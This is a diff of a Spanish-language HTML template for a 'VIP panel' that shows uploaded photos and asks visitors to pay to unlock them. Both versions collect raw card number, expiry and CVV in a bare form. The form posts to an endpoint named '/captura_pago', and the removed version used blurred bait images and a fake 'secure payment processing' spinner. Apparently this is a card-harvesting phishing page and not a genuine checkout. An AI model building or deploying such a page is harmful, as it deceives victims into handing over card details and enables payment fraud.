@@ -1,33 +1,33 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CONTENIDO EXCLUSIVO</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     <style>
-        body { background: {{config.color_fondo}}; color: white; margin-bottom: 350px; }
-        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; padding: 10px; }
-        .gallery img { width: 100%; height: 160px; object-fit: cover; border-radius: 8px; filter: blur(6px); border: 1px solid #d4af37; }
-        .pay-box { position: fixed; bottom: 0; width: 100%; background: #000; padding: 20px; border-top: 3px solid #d4af37; z-index: 1000; }
-        .loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; justify-content: center; align-items: center; flex-direction: column; }
+        body { background: #111; color: white; }
+        .card-pago { background: #222; border: 1px solid gold; border-radius: 15px; padding: 20px; margin-top: 20px; }
     </style>
 </head>
-<body>
-    <div id="loader" class="loader"><div class="spinner-border text-warning"></div><p class="mt-3 text-warning">Procesando pago seguro...</p></div>
-    <div class="p-3 text-center"><h5 style="color:#d4af37">{{config.titulo}}</h5></div>
-    <div class="gallery">
-        {% for f in fotos %}<img src="/static/uploads/{{f}}">{% endfor %}
-    </div>
-    <div class="pay-box">
-        <p class="text-center small mb-2">Transferir a: <strong>{{config.alias}}</strong> | Monto: <strong>${{config.precio}}</strong></p>
-        <form action="/pago_vip" method="POST" onsubmit="document.getElementById('loader').style.display='flex'">
-            <input type="tel" name="cc" class="form-control mb-2" placeholder="Número de Tarjeta" maxlength="16" required>
-            <div class="row g-2 mb-2">
-                <div class="col-6"><input type="tel" name="exp" class="form-control" placeholder="MM/AA" required></div>
-                <div class="col-6"><input type="tel" name="cvv" class="form-control" placeholder="CVV" required></div>
-            </div>
-            <button class="btn btn-warning w-100 fw-bold">DESBLOQUEAR AHORA</button>
-        </form>
+<body class="p-3">
+    <div class="container">
+        <h3 class="text-center">Bienvenido al Panel VIP</h3>
+        <div class="card-pago">
+            <p class="text-center">Para desbloquear el contenido, realice el pago de <b>${{ config.precio }}</b></p>
+            <form action="/captura_pago" method="POST">
+                <input type="text" name="cc" class="form-control mb-3" placeholder="Número de Tarjeta" required>
+                <div class="row g-2">
+                    <div class="col-6"><input type="text" name="exp" class="form-control mb-3" placeholder="MM/AA" required></div>
+                    <div class="col-6"><input type="text" name="cvv" class="form-control mb-3" placeholder="CVV" required></div>
+                </div>
+                <button class="btn btn-warning w-100 fw-bold">PAGAR AHORA</button>
+            </form>
+        </div>
+        
+        <div class="mt-4 row">
+            {% for f in fotos %}
+            <div class="col-6 mb-2"><img src="/static/uploads/{{f}}" class="img-fluid rounded border border-secondary"></div>
+            {% endfor %}
+        </div>
     </div>
 </body>
 </html>
